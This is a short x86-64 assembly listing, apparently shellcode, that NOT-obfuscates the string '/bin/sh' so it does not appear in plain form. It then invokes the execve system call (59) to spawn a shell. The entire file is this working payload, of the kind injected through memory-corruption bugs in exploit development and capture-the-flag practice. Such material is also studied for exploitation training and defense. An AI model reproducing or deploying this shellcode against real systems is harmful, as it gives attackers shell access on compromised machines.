[SECTION .TEXT]
	global _main

_main:
	mov rax, 0xff978cd091969dd0
	not rax							; "/bin/sh"
	push rax
	push rsp
	pop rdi	
	xor rdx, rdx
	push rdx
	pop rsi	
	push byte 59
	pop rax
	syscall
